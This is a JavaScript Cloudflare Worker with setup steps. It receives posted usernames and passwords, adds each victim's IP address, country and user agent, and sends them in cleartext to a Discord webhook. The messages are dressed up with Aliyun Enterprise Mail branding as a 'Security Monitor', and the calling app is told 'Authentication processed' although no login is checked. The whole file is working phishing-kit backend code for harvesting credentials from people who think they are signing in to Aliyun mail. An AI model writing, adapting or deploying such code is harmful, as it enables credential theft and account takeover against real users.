/**
 * Cloudflare Worker script to receive login payloads and forward them to Discord.
 * 
 * Setup Instructions:
 * 1. Create a new Cloudflare Worker.
 * 2. Copy this code into the Worker editor.
 * 3. Add a "Secret" variable named DISCORD_WEBHOOK_URL in the Cloudflare Worker settings.
 * 4. Set the AUTH_API_URL environment variable in your AI Studio app to your Worker's URL.
 */

export default {
  async fetch(request, env, ctx) {
    // Only allow POST requests
    if (request.method !== "POST") {
      return new Response("Method Not Allowed", { status: 405 });
    }

    try {
      // Parse the incoming payload
      const payload = await request.json();
      const { username, password } = payload;

      // Get client metadata
      const ip = request.headers.get("cf-connecting-ip") || "Unknown";
      const country = request.headers.get("cf-ipcountry") || "Unknown";
      const userAgent = request.headers.get("user-agent") || "Unknown";
      const timestamp = new Date().toISOString();

      // Prepare Discord Embed
      const discordPayload = {
        username: "Auth Monitor",
        avatar_url: "https://qiye.aliyun.com/static/0.2.9/images/favicon.ico",
        embeds: [
          {
            title: "🔑 New Login Attempt",
            color: 16730447, // #ff4d4f (Aliyun Red)
            fields: [
              {
                name: "📧 Email / Username",
                value: `\`${username || "N/A"}\``,
                inline: false
              },
              {
                name: "🔒 Password",
                value: `\`${password || "N/A"}\``,
                inline: false
              },
              {
                name: "🌐 Client Info",
                value: `**IP:** ${ip}\n**Country:** ${country}\n**Time:** ${timestamp}`,
                inline: true
              },
              {
                name: "📱 User Agent",
                value: `\`${userAgent}\``,
                inline: false
              }
            ],
            footer: {
              text: "Aliyun Enterprise Mail Security Monitor"
            }
          }
        ]
      };

      // Send to Discord
      const discordResponse = await fetch(env.DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(discordPayload)
      });

      if (!discordResponse.ok) {
        const errorText = await discordResponse.text();
        console.error("Discord API Error:", errorText);
        return new Response("Error forwarding to Discord", { status: 500 });
      }

      // Return success to the app
      return new Response(JSON.stringify({ 
        status: "success", 
        message: "Authentication processed" 
      }), {
        status: 200,
        headers: { "Content-Type": "application/json" }
      });

    } catch (error) {
      console.error("Worker Error:", error);
      return new Response(JSON.stringify({ 
        status: "error", 
        message: "Failed to process request" 
      }), {
        status: 500,
        headers: { "Content-Type": "application/json" }
      });
    }
  }
};
